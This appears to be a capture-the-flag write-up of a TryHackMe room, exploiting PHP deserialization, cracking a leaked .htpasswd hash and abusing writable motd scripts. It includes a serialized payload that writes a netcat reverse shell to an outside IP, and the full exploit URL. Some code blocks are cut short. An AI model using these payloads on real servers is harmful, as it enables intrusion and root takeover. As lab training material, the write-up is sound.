After I finished the Wekor room by [ustoun0](https://tryhackme.com/p/ustoun0), I was very curious to try their other rooms. Debug was also fun, but a lot easier to do. On this one, I had to exploit PHP serialization, find a password in a hidden file and exploit bad file permissions on the Linux Message Of The Day.

Linux Machine CTF! You'll learn about enumeration, finding hidden password files and how to exploit php deserialization!

Hey everybody!

Welcome to this Linux CTF Machine!

The main idea of this room is to make you learn more about php deserialization!

I hope you enjoy your journey :)
```

## Enumeration

I started by enumerating the machine. Port 22 (SSH) and 80 (HTTP) where opened.

```bash
$ rustscan -a target -- -A -script vuln | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

## Web Site

I looked at the web site. It only displayed the Apache default page.

![Apache Default](/assets/images/2021/06/Debug/01_ApacheDefault.png "Apache Default")

I launched Gobuster to find hidden files and folders.

```bash
$ gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.txt                                                                                 [3/3]

This showed me that there is also an `index.php` file.

![Welcome To Base](/assets/images/2021/06/Debug/02_WelcomeToBase.png "Welcome To Base")

The backup folder contained a copy of the index.php, but renamed to `index.php.bak` so I could download it without it being interpreted on the server.

![Backup](/assets/images/2021/06/Debug/03_Backup.png "Backup")

It contained some html, but the interesting part was in a  PHP block near the end.

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name'];
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();

?>
```

This code take the name, email and comment passed in the GET by a form on the page. It uses those values to build a message that gets written to the file `message.txt` when the object is destructed.

I tested it in the `index.php` page by sending this [http://target.thm/index.php?name=test&email=test&comments=test&select=1&checkbox=1](http://target.thm/index.php?name=test&email=test&comments=test&select=1&checkbox=1).

Then I  navigated to [http://target.thm/message.txt](http://target.thm/message.txt) and my data had been added to the file.

```
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From : test || From Email : test || Comment : test

```

In the PHP file, there is some code left there for debugging.

```php
// Leaving this for now... only for debug purposes... do not touch!
$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);
```

If the URL contains a `debug` parameter, it will unserialize its content. That meant I could serialize an object of the class FormSubmit with the file and message I wanted. The server would then unserialize it, and when it would reach the end of the PHP block, the object would be out of scope and the class destructor would be called and my message would be written to the file I choose.

I created the object to insert a reverse shell in the file shell.php.

```php
<?php

class FormSubmit {

	public $form_file = 'shell.php';
	public $message = "
<?php
`mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`;
	";

}

$o = new FormSubmit();
echo urlencode(serialize($o)) . "\n";
```

I ran the code that printed the serialized and URL encoded object.

```bash
$ php test.php
O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A112%3A%22%0A%3C%3Fphp%0A%60mkfifo+%2Ftmp%2Fkirxhbg%3B+nc+10.13.3.36+4444+0%3C%2Ftmp%2Fkirxhbg+%7C+%2Fbin%2Fsh+%3E%2Ftmp%2Fkirxhbg+2%3E%261%3B+rm+%2Ftmp%2Fkirxhbg%60%3B%0A%09%22%3B%7D

```

Then I opened the index file passing it my serialized object in the debug parameter:
```
http://target.thm/index.php?name=test&email=test&comments=test&select=1&checkbox=1&debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A112%3A%22%0A%3C%3Fphp%0A%60mkfifo+%2Ftmp%2Fkirxhbg%3B+nc+10.13.3.36+4444+0%3C%2Ftmp%2Fkirxhbg+%7C+%2Fbin%2Fsh+%3E%2Ftmp%2Fkirxhbg+2%3E%261%3B+rm+%2Ftmp%2Fkirxhbg%60%3B%0A%09%22%3B%7D
```

I then started a netcat listener and accessed my new [shell.php](http://target.thm/shell.php)

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444

## James Password

Once connected, I started looking around the server. I missed it at first, but there was a .htpasswd file in the web root.

```bash
www-data@osboxes:/$ ls -la /var/www/html/

www-data@osboxes:/$ cat /var/www/html/.htpasswd
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```

I used hashcat to crack the password. The password was pretty weak, it took 4 seconds to crack it. 

```bash
$ hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt

I used the cracked password to connect as james, and it worked.

```bash
$ ssh james@target

## Getting root

Jame's home folder had a text file with a note from root.

```bash
$ cat Note-To-James.txt
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it?

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :)

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

According to this note, I should be able to modify the Message Of The Day (motd). 

```bash
james@osboxes:~$ ls -l /etc/update-motd.d/

All the files are writable by james. Those files are executed by root. To get root I added a reverse shell at the end of `/etc/update-motd.d/10-help-text`.  It would be executed at the next login. 

```bash
james@osboxes:~$ cat /etc/update-motd.d/10-help-text

```

Then I logged out, started a netcat listener, and connected back.

```bash
$ ssh james@target

My listener got the connection back from the root user.

```bash
$ nc -lvnp 4444
